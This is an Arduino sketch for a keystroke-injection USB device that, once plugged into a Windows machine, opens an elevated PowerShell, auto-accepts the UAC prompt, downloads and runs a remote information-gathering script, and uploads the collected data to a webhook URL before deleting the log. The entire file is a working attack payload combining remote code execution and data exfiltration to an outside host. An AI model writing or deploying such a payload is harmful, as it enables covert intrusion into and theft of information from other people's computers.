#include<Keyboard.h>

void setup() {
    Keyboard.begin();
    delay(3000);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(650);
    Keyboard.println("powershell Start-Process powershell -Verb runAs");
    delay(2500);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press('y');
    Keyboard.releaseAll();
    delay(500);
    Keyboard.println("IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/hak5/bashbunny-payloads/master/payloads/library/recon/InfoGrabber/info.ps1') > log.txt; powershell Invoke-WebRequest -Uri https://webhook.site/yoururl -Method POST -InFile log.txt; del log.txt; exit");
}
void loop (){
}
